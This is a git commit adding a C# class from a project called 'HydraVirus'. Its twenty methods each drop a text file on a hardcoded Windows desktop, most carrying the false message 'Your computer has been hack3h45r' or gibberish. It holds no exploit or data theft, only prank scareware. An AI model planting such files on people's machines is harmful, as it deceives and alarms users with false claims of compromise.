e691824e33cf19d027e3f2e064d26047587f0b35
Pralka53 <79445105+Pralka53@users.noreply.github.com>
2021-07-28 19:45:32 +0200

    Add files via upload

---
+++ HydraVirus/TextFileCreator.cs
@@ -0,0 +1,232 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace HydraVirus
+{
+    class TextFileCreator
+    {
+        public void Text1()
+        {
+            string path = @"C:\Users\pc\Desktop\Hydra.txt";
+            string txt = "Your computer has been hack3h45r";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text2()
+        {
+            string path = @"C:\Users\pc\Desktop\asrhjt.txt";
+            string txt = "Your computer has been hack3h45r";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text3()
+        {
+            string path = @"C:\Users\pc\Desktop\Hydshtr.txt";
+            string txt = "Y08r com53uter hAs b33n hack3h45r";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text4()
+        {
+            string path = @"C:\Users\pc\Desktop\Hyd523ra.txt";
+            string txt = "125513151515151515151515";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text5()
+        {
+            string path = @"C:\Users\pc\Desktop\Hyd2ra.txt";
+            string txt = "5353535353535353535353535353535355";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text6()
+        {
+            string path = @"C:\Users\pc\Desktop\Hydr53a.txt";
+            string txt = "5312152312535123512352134";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text7()
+        {
+            string path = @"C:\Users\pc\Desktop\HHHHHydra.txt";
+            string txt = "Your computer has been hack3h45r";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text8()
+        {
+            string path = @"C:\Users\pc\Desktop\HydrA.txt";
+            string txt = "h3rqqqh3hq3rq3rqr3hq3rhq3rhq3rhq3rqh3rq3rh";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text9()
+        {
+            string path = @"C:\Users\pc\Desktop\H6dra.txt";
+            string txt = "Your computer has been hack3h45r";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text10()
+        {
+            string path = @"C:\Users\pc\Desktop\Hy412152dra.txt";
+            string txt = "dktuw456oiek7w4o6ikw46o5k57olkw64e4wso567l";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text11()
+        {
+            string path = @"C:\Users\pc\Desktop\ardyh.txt";
+            string txt = ":)";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text12()
+        {
+            string path = @"C:\Users\pc\Desktop\Hdra.txt";
+            string txt = ":(";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text13()
+        {
+            string path = @"C:\Users\pc\Desktop\1ydra.txt";
+            string txt = "hq35  q3h54rrqg3e";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text14()
+        {
+            string path = @"C:\Users\pc\Desktop\lhlhydra.txt";
+            string txt = "Your gyhgyhujgfyhu";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text15()
+        {
+            string path = @"C:\Users\pc\Desktop\Hydloa.txt";
+            string txt = "evqxy uizeiis";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text16()
+        {
+            string path = @"C:\Users\pc\Desktop\Hydraaa.txt";
+            string txt = "Mceo3m45x eiis mcz evqxyuiz avyz";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text17()
+        {
+            string path = @"C:\Users\pc\Desktop\Hyd5a.txt";
+            string txt = "llljhgfdedfrtyhjgvtrfcdewwwwerty87uy6t54e567u7654e567";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text18()
+        {
+            string path = @"C:\Users\pc\Desktop\Htfura.txt";
+            string txt = "1634643126341137173713481484873148514587h45r";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text19()
+        {
+            string path = @"C:\Users\pc\Desktop\DZAHYA.txt";
+            string txt = "Hack3h45r been has computer your";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+
+        public void Text20()
+        {
+            string path = @"C:\Users\pc\Desktop\OPOPOPOP.txt";
+            string txt = "HI!";
+            StreamWriter sw;
+
+            sw = File.CreateText(path);
+            sw.WriteLine(txt);
+            sw.Close();
+        }
+    }
+}
